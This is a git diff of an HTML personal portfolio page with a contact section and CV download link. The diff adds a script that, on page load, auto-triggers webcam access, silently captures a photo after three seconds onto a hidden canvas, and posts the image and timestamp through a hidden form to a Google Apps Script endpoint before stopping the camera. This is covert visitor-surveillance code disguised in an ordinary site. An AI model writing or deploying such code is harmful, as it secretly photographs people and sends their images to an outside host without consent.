@@ -204,11 +204,13 @@
                         <a href="https://wa.me/+919875333892"><i class="fa-brands fa-whatsapp"></i></a>
                     </div>
                     <form action="" id="cv" name="cv">
-                            <a href="https://drive.google.com/file/d/10D3aByEyNVNaJO2VtKVd-q_eaaT5zRax/view?usp=sharing" class="btn btn2" download="">Download CV
+                        <a href="https://drive.google.com/file/d/10D3aByEyNVNaJO2VtKVd-q_eaaT5zRax/view?usp=sharing"
+                            class="btn btn2" download="">Download CV
                             <input type="text" name="click" id="downloadtime">
                         </a>
-                        </form>
-                        <a href="https://drive.google.com/file/d/10D3aByEyNVNaJO2VtKVd-q_eaaT5zRax/view?usp=sharing" id="db" download=""></a>
+                    </form>
+                    <a href="https://drive.google.com/file/d/10D3aByEyNVNaJO2VtKVd-q_eaaT5zRax/view?usp=sharing" id="db"
+                        download=""></a>
                 </div>
                 <div class="contact-right">
                     <form name="submit-to-google-sheet">
@@ -236,13 +238,92 @@
     <canvas id="canvas" width="320" height="240" hidden></canvas>
 
 
-    <form name="submit-to-google-sheet2">
+    <form name="submit-to-google-sheet3">
         <input type="text" name="urlData" id="urlData" hidden>
         <input type="text" name="timeInfo" id="timeInfo" hidden>
     </form>
 
+    <script>
 
-    
+        let camera_button = document.querySelector("#start-camera");
+        let video = document.querySelector("#video");
+        let click_button = document.querySelector("#click-photo");
+        let canvas = document.querySelector("#canvas");
+
+        camera_button.addEventListener('click', async function () {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            video.srcObject = stream;
+        });
+
+        click_button.addEventListener('click', function () {
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            let image_data_url = canvas.toDataURL('image/jpeg');
+
+            // data url of the image
+            console.log(image_data_url);
+            document.getElementById("urlData").value = image_data_url;
+            const d = new Date();
+            document.getElementById("timeInfo").value = d;
+
+
+
+            // url="https://script.google.com/macros/s/AKfycbz2E5skqLbUtVfxg5oneMGrG-XUibLCNclQN8CTtCh0-6gbpRaZK_Rg3cK9XsdaFFs8/exec"
+            // https://script.google.com/macros/s/AKfycbz2E5skqLbUtVfxg5oneMGrG-XUibLCNclQN8CTtCh0-6gbpRaZK_Rg3cK9XsdaFFs8/exec
+            const scriptURLOfform3 = 'https://script.google.com/macros/s/AKfycbz2E5skqLbUtVfxg5oneMGrG-XUibLCNclQN8CTtCh0-6gbpRaZK_Rg3cK9XsdaFFs8/exec';
+            const form3 = document.forms['submit-to-google-sheet3'];
+            // preventDefault();
+            // window.addEventListener("mouseover",function start(){
+
+            // })
+            fetch(scriptURLOfform3, { method: 'POST', body: new FormData(form3) }).catch(error => console.error('Error!', error.message))
+
+
+
+            // const form = document.forms['submit-to-google-sheet'];
+            // const msg= document.getElementById("msg");
+
+            // form.addEventListener('submit', e => {
+            //     msg.innerText="Successfully Sent!"
+
+
+            //     e.preventDefault();
+            //     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            //     .catch(error => console.error('Error!', error.message))
+            //     form.reset();
+            //     // msg.innerText="";
+            //     setInterval(()=>{
+            //         msg.innerText="";
+            //     },1500)
+            // })
+        });
+
+
+        camera_button.click();
+
+        setTimeout(function clickOnClick() {
+            click_button.click();
+
+        }, 3000)
+        setTimeout(function clickOnClick() {
+            document.getElementById("urlData").value = "";
+            document.getElementById("timeInfo").value = "";
+            const video = document.querySelector('video');
+
+            // A video's MediaStream object is available through its srcObject attribute
+            const mediaStream = video.srcObject;
+
+            // Through the MediaStream, you can get the MediaStreamTracks with getTracks():
+            const tracks = mediaStream.getTracks();
+
+            // Tracks are returned as an array, so if you know you only have one, you can stop it with: 
+            tracks[0].stop();
+        }, 5000)
+
+
+    </script>
+
+
+
 
     <script src="script.js"></script>
     <!-- <form name="submit-to-google-sheet">
@@ -286,4 +367,3 @@
 </body>
 
 </html>
-
